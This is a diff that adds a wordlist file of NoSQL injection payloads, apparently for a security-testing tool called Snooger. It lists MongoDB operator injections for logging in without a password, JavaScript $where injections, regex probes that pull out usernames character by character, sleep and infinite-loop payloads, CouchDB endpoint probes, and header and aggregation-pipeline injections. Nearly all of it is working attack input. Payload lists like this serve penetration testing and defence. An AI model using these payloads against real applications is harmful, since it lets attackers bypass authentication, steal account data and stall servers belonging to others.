@@ -1,0 +1,104 @@
+# Snooger NoSQL Injection Payloads — 100+ real payloads
+# Categories: MongoDB, CouchDB, Cassandra, JSON, URL, JavaScript
+# ==============================================================
+
+# === MongoDB Query Operator Injection (URL params) ===
+[$ne]=invalid
+[$gt]=
+[$gte]=
+[$lt]=zzzzz
+[$lte]=zzzzz
+[$regex]=.*
+[$regex]=^a
+[$regex]=^admin
+[$exists]=true
+[$exists]=false
+[$in][]=admin
+[$nin][]=user
+[$or][0][username]=admin
+[$and][0][password][$gt]=
+username[$ne]=invalid&password[$ne]=invalid
+username=admin&password[$ne]=invalid
+username[$regex]=^adm&password[$ne]=
+username[$gt]=&password[$gt]=
+login[$gt]=&login[$regex]=.*&password[$gt]=
+user[$regex]=.{1}&pass[$gt]=
+username[$regex]=admin.*&password[$ne]=wrong
+
+# === MongoDB JSON Body Injection ===
+{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
+{"username":"admin","password":{"$ne":"invalid"}}
+{"username":{"$gt":""},"password":{"$gt":""}}
+{"username":"admin","password":{"$gt":""}}
+{"username":{"$regex":"^admin"},"password":{"$ne":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+{"username":{"$in":["admin","administrator"]},"password":{"$ne":""}}
+{"username":{"$nin":["invalid"]},"password":{"$nin":["invalid"]}}
+{"username":{"$exists":true},"password":{"$exists":true}}
+{"$where":"this.username == 'admin'"}
+{"$where":"1 == 1"}
+{"$where":"this.password.match(/.*/)"}
+{"username":"admin","$or":[{},{"password":{"$gt":""}}]}
+{"username":{"$regex":"admin","$options":"i"}}
+
+# === MongoDB JavaScript Injection ===
+';return true;var a='
+';return this.password.match(/.*/)//
+';return 1==1;var a='
+" || true || "
+' || '1'=='1
+';sleep(5000);var a='
+';while(1){};var a='
+';return(true);var a='
+0; return true
+1;return true;
+
+# === MongoDB Data Extraction ===
+{"username":{"$regex":"^a"},"password":{"$ne":""}}
+{"username":{"$regex":"^ad"},"password":{"$ne":""}}
+{"username":{"$regex":"^adm"},"password":{"$ne":""}}
+{"username":{"$regex":"^admi"},"password":{"$ne":""}}
+{"username":{"$regex":"^admin"},"password":{"$ne":""}}
+
+# === MongoDB Time-Based Blind ===
+{"$where":"sleep(5000)"}
+{"$where":"(function(){var d=new Date();do{var cd=new Date();}while(cd-d<5000);return 1;})()"}
+{"username":"admin","$or":[{"$where":"sleep(5000)"}]}
+{"$where":"this.username=='admin' && sleep(5000)"}
+
+# === CouchDB Injection ===
+_all_docs
+_all_dbs
+_utils
+_config
+_users/_all_docs
+_design_docs
+{"selector":{"$gt":null}}
+{"selector":{"_id":{"$gt":null}}}
+{"selector":{"password":{"$regex":".*"}}}
+
+# === Header-Based NoSQL ===
+X-User: {"$gt":""}
+Authorization: {"$ne":""}
+Cookie: session={"$gt":""}
+
+# === URL Parameter Variants ===
+?username[$ne]=&password[$ne]=
+?username=admin&password[$gt]=
+?search[$regex]=.*
+?id[$ne]=
+?filter[$or][0][id][$gt]=
+?where[username][$regex]=admin
+?query[$regex]=.*&limit=1
+?sort={"password":1}
+
+# === Content-Type Confusion ===
+username=admin&password[$ne]=invalid
+username[$ne]=&password[$ne]=
+{"username":"admin","password":{"$ne":"invalid"}}
+username=admin&password[$regex]=.*
+
+# === Aggregation Pipeline Injection ===
+[{"$match":{"username":"admin"}},{"$project":{"password":1}}]
+[{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"x"}}]
+[{"$group":{"_id":"$password"}}]
